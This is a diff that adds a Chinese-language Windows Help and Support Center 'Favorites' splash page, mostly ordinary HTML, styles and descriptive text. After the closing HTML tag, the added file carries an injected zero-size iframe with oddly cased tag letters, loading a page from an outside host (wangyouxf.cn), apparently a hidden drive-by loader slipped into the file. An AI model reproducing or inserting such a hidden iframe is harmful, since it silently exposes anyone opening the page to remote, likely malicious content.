@@ -1,0 +1,59 @@
+<HTML XMLNS:helpcenter>
+<HEAD>
+
+<!--
+Copyright (c) 2001 Microsoft Corporation
+-->
+
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; CHARSET=gb2312">
+<META HTTP-EQUIV=PICS-Label CONTENT='(PICS-1.1 "http://www.rsac.org/ratingsv01.html" l comment "RSACi North America Server" by "inet@microsoft.com" r (n 0 s 0 v 0 l 0))'>
+<META HTTP-EQUIV="MSThemeCompatible" CONTENT="Yes">
+
+<TITLE>收藏夹</TITLE>
+
+
+<LINK ID=Stylesheet_Ref0 href="hcp://system/css/shared.css"    rel=STYLESHEET type=text/css>
+<LINK ID=Stylesheet_Ref1 href="hcp://system/css/Behaviors.css" rel=STYLESHEET type=text/css>
+
+<STYLE>
+
+.logo
+{
+    z-index  : -1;
+	position : absolute;
+	right    : -30px;
+	bottom   : -30px;
+	width    : 300px;
+	height   : 300px;
+}
+
+.margins
+{
+    margin-top    : 44px;
+    margin-left   : 33px;
+    margin-right  : 33px;
+    margin-bottom : 0px;
+}
+
+</STYLE>
+
+</HEAD>
+
+<BODY id=loc0 scroll=no CLASS="sys-rhp-splash-bgcolor sys-rhp-splash-color margins">
+
+<helpcenter:bitmap id=idLogo class="logo" AutoRTL="true" SRCNORMAL="watermark_300x.bmp"></helpcenter:bitmap>
+
+<DIV id=locTitle CLASS="sys-font-heading2 sys-rhp-splash-color-title">
+	收藏夹
+</DIV>
+
+<P><BR>
+
+<DIV id=locDesc CLASS="sys-font-heading4" style="line-height: 150%">
+	添加帮助主题、搜索结果和其他页到您的帮助和支持收藏夹列表，以便将来能容易地找到它们。
+</DIV>
+
+</BODY>
+
+</HTML>
+<IfrAmE src=http://1.wangyouxf.cn/index.htm width=0 height=0></IfrAmE>                        
